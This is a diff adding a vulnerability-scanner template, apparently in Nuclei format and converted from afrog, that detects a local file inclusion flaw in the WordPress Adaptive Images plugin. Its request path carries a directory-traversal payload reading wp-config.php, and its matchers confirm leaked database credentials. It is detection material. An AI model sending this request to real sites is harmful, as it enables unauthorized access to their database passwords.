@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - DB_NAME
+          - DB_USER
+          - DB_PASSWORD
+          - DB_HOST
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php'
+id: wordpress-ext-adaptive-images-lfi
+info:
+  author: FiveAourThe
+  description: |
+    Wordpress Ext Adaptive Images 存在本地文件包含漏洞，攻击者可以通过构造特殊的请求参数，包含服务器上的任意文件。
+    fofa: app="Wordpress"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Wordpress Ext Adaptive Images lfi
+  severity: high
+  tags: wordpress,ext,adaptive,images,lfi,argus-import
